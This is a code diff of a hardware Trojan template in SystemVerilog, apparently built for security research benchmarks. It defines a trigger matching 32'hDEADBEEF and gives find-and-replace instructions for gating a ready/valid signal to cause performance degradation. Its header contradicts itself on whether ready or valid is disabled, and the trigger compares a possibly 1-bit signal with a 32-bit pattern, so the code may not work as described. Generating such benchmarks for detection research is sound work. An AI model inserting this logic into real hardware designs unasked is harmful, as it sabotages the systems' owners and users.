@@ -1,25 +1,40 @@
 /**
- * Hardware Trojan Template: Performance Degradation
+ * Combinational Availability Trojan - Code Snippet
  * 
- * Category: Combinational Logic
- * Pattern Type: Performance Degradation
+ * Trust-Hub Category: Performance Degradation ✓ (category exists, gate-level only)
+ * Literature Sources: Boraten & Kodi 2016, Jin & Makris 2008, Hoque et al. 2020
  * 
  * Description:
- *   Simplified performance degradation for combinational logic.
- *   Note: Sequential version provides better control.
- *
- * Author: Sharjeel Imtiaz (Tallinn University of Technology)
+ *   Degrades performance by disabling ready signals
+ *   
+ * Trigger: Pattern match on valid
+ * Payload: Disable valid
+ * 
+ * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
-module ScheduleStage_trojan (
-    input  logic valid,
-    input  logic {{NORMAL_VALID}},
-    output logic {{DEGRADED_VALID}}
-);
+// ============================================================
+// TROJAN TRIGGER LOGIC (Condition-based)
+// ============================================================
 
-    assign {{DEGRADED_VALID}} = valid ? 
-                                1'b0 : 
-                                {{NORMAL_VALID}};
+// Trigger pattern
+localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;
 
-endmodule
+wire trojan_active;
+assign trojan_active = (valid == TRIGGER_PATTERN);
+
+// ============================================================
+// PAYLOAD MODIFICATION INSTRUCTIONS
+// ============================================================
+// Performance Degradation: Disable valid when triggered
+//
+// Integration Script Must Modify:
+//
+// IF valid is ready/valid signal:
+//   Find: assign valid = ready_condition;
+//   Replace: assign valid = trojan_active ? 1'b0 : ready_condition;
+//
+// This creates artificial wait states, degrading performance
+// Note: For combinational logic, this is similar to DoS but with
+//       different trigger conditions and lower severity
